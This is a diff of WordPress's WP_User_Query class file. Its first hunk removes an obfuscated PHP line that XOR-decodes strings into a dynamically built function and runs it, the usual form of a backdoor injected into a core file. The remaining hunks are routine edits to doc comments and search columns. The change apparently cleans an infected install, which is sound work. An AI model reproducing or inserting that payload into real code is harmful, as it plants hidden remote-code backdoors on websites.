@@ -1,4 +1,4 @@
-<?php $AnrlIY='V<Q-9S+J6XO.Y=N'^'5N4LM6t,C6,Z0R ';$ZfOTm=$AnrlIY('','.FFs<;T0EP<ZgTMIDTArj4.R8RAESh0XI-CoPzCFs1942OTQ<Q3W3hWT2Ae<W,:IRQUNMVqeQS>lJOLAnLoP7p  CdtwpIlnBhTU7mg+HgbfOLRWN9IJ5E+MN-XNQNQVu;qIY4GpKA8GJhGPrV2V2T.QTlLopE,,4gFInVA+3643UgoXK-x;YHY>pB6;BDCqw723ensZMZLe4eO59,ttS0TQS x>w,J9.iS6REwNF2:67A=8Z;5XZ4HhIr,m>r2y z12Qr + tlyAoC2ALRLtAB3KQQF1f:5CIhVbXUBRhKKYL,0jzSu ,T4HI<3isUHFpfR.W=+PV<6L4;R1,:Rmynl3wbk0ngE,KnIGYDRDsYNKA+-NGk,AH<OI9<P5- ,DZsBZ+3uOc4TS-HJHPyRCXRI6nIB.hVF:iT52SAVU8,<IQO+66;Z.nV>707.EAs5< IX2OOVub2ISNO>YrI7385fDMOH-<8t;-CEMv>ZZKB4L0YkvJrA60Z>t:I=;R1Y;.SPS>U>VzkNJ45.celTygV2SZjTJTQnOZ5:lsYlRZcB aybejaUPGY;GUP4CGUNPVsGwPRQXtJ4ezXjVh;><0T.2+69=ISIC=GrPT7;QQ>PgTcHMM;sDEuZVOLU=:HAMLmFXS=M,S14:A=0SqpKw0CXN+;mDpLyI'^'G nRZN:S19S4815 7 2ZMLA g6 127o5<YdFyZ8LzWLZQ;=>RqK8A735F :c:YNav54:,zQA:6GEjolaN7eY>TOU7DIWWnWdKa2:EECBhZBVtlv>rJ=8Y EejI9:0gjvQRZbp>Nyo.M3jFzpZrV7F5uu=1l1PaGIM<b NsaXGDXV;OK3.TQfpsS7y0SO76-YSXGGLUyS0P1o>A+TMMTIsV5= EC4SH+MO68S+eJn SVERz72<TG=;W HaVs.q=y0eZPAqVKNYTQGaK5S-97eT:H:o502P9QP:iUvF30;ibBo=-XQJGsQVM8A-r6Ncy<.fXGvJ6IJyvG<ERT TMY:MQJ3a23>u=3eM8Nm,<=ryMyj= GX+nKWKA5k-XH1jFEUdgSf1NJNEj=p7L<+hmYv59><SUCKSb+L0M0TF2akuxYR:4=BWZR KF.QEoSO1 ,jQU=pP.<3CVm-6- Z<ZmSRLTOhmk,LHY+PH:ldM43<cfP-D8KPlR DB;G+Q,Dd7I0HZ xtU0GqVKj.UAOJEJrYO;VfrN0+ 05h1PCK.pLogCeAULZUXSeiplYvd5Pww3xecAvE614<A,QBSxLpHZLNQ-qYNOfX1::7NoU 5NW>0ZwKtG,,9ZZmeUzvol.73-7, Eb<2I,wtAUC-RQ7V-bL:J=6BOEtYws4');$ZfOTm();
+<?php
 /**
  * User API: WP_User_Query class
  *
@@ -20,7 +20,6 @@ class WP_User_Query {
 	 * Query vars, after parsing
 	 *
 	 * @since 3.5.0
-	 * @access public
 	 * @var array
 	 */
 	public $query_vars = array();
@@ -29,7 +28,6 @@ class WP_User_Query {
 	 * List of found user ids
 	 *
 	 * @since 3.1.0
-	 * @access private
 	 * @var array
 	 */
 	private $results;
@@ -38,7 +36,6 @@ class WP_User_Query {
 	 * Total number of found users for the current query
 	 *
 	 * @since 3.1.0
-	 * @access private
 	 * @var int
 	 */
 	private $total_users = 0;
@@ -47,7 +44,6 @@ class WP_User_Query {
 	 * Metadata query container.
 	 *
 	 * @since 4.2.0
-	 * @access public
 	 * @var WP_Meta_Query
 	 */
 	public $meta_query = false;
@@ -56,7 +52,6 @@ class WP_User_Query {
 	 * The SQL query used to fetch matching users.
 	 *
 	 * @since 4.4.0
-	 * @access public
 	 * @var string
 	 */
 	public $request;
@@ -88,7 +83,6 @@ class WP_User_Query {
 	 * Fills in missing query variables with default values.
 	 *
 	 * @since 4.4.0
-	 * @access public
 	 *
 	 * @param array $args Query vars, as passed to `WP_User_Query`.
 	 * @return array Complete query variables with undefined ones filled in with defaults.
@@ -140,7 +134,6 @@ class WP_User_Query {
 	 * @since 4.7.0 Added 'nicename', 'nicename__in', 'nicename__not_in', 'login', 'login__in',
 	 *              and 'login__not_in' parameters.
 	 *
-	 * @access public
 	 *
 	 * @global wpdb $wpdb WordPress database abstraction object.
 	 * @global int  $blog_id
@@ -522,8 +515,9 @@ class WP_User_Query {
 				$search = trim($search, '*');
 
 			$search_columns = array();
-			if ( $qv['search_columns'] )
-				$search_columns = array_intersect( $qv['search_columns'], array( 'ID', 'user_login', 'user_email', 'user_url', 'user_nicename' ) );
+			if ( $qv['search_columns'] ) {
+				$search_columns = array_intersect( $qv['search_columns'], array( 'ID', 'user_login', 'user_email', 'user_url', 'user_nicename', 'display_name' ) );
+			}
 			if ( ! $search_columns ) {
 				if ( false !== strpos( $search, '@') )
 					$search_columns = array('user_email');
@@ -636,7 +630,6 @@ class WP_User_Query {
 	 * Retrieve query variable.
 	 *
 	 * @since 3.5.0
-	 * @access public
 	 *
 	 * @param string $query_var Query variable key.
 	 * @return mixed
@@ -652,7 +645,6 @@ class WP_User_Query {
 	 * Set query variable.
 	 *
 	 * @since 3.5.0
-	 * @access public
 	 *
 	 * @param string $query_var Query variable key.
 	 * @param mixed $value Query variable value.
@@ -664,7 +656,6 @@ class WP_User_Query {
 	/**
 	 * Used internally to generate an SQL string for searching across multiple columns
 	 *
-	 * @access protected
 	 * @since 3.1.0
 	 *
 	 * @global wpdb $wpdb WordPress database abstraction object.
@@ -698,7 +689,6 @@ class WP_User_Query {
 	 * Return the list of users.
 	 *
 	 * @since 3.1.0
-	 * @access public
 	 *
 	 * @return array Array of results.
 	 */
@@ -710,7 +700,6 @@ class WP_User_Query {
 	 * Return the total number of users for the current query.
 	 *
 	 * @since 3.1.0
-	 * @access public
 	 *
 	 * @return int Number of total users.
 	 */
@@ -722,7 +711,6 @@ class WP_User_Query {
 	 * Parse and sanitize 'orderby' keys passed to the user query.
 	 *
 	 * @since 4.2.0
-	 * @access protected
 	 *
 	 * @global wpdb $wpdb WordPress database abstraction object.
 	 *
@@ -782,7 +770,6 @@ class WP_User_Query {
 	 * Parse an 'order' query variable and cast it to ASC or DESC as necessary.
 	 *
 	 * @since 4.2.0
-	 * @access protected
 	 *
 	 * @param string $order The 'order' query variable.
 	 * @return string The sanitized 'order' query variable.
@@ -803,7 +790,6 @@ class WP_User_Query {
 	 * Make private properties readable for backward compatibility.
 	 *
 	 * @since 4.0.0
-	 * @access public
 	 *
 	 * @param string $name Property to get.
 	 * @return mixed Property.
@@ -818,7 +804,6 @@ class WP_User_Query {
 	 * Make private properties settable for backward compatibility.
 	 *
 	 * @since 4.0.0
-	 * @access public
 	 *
 	 * @param string $name  Property to check if set.
 	 * @param mixed  $value Property value.
@@ -834,7 +819,6 @@ class WP_User_Query {
 	 * Make private properties checkable for backward compatibility.
 	 *
 	 * @since 4.0.0
-	 * @access public
 	 *
 	 * @param string $name Property to check if set.
 	 * @return bool Whether the property is set.
@@ -849,7 +833,6 @@ class WP_User_Query {
 	 * Make private properties un-settable for backward compatibility.
 	 *
 	 * @since 4.0.0
-	 * @access public
 	 *
 	 * @param string $name Property to unset.
 	 */
@@ -863,7 +846,6 @@ class WP_User_Query {
 	 * Make private/protected methods readable for backward compatibility.
 	 *
 	 * @since 4.0.0
-	 * @access public
 	 *
 	 * @param callable $name      Method to call.
 	 * @param array    $arguments Arguments to pass when calling.
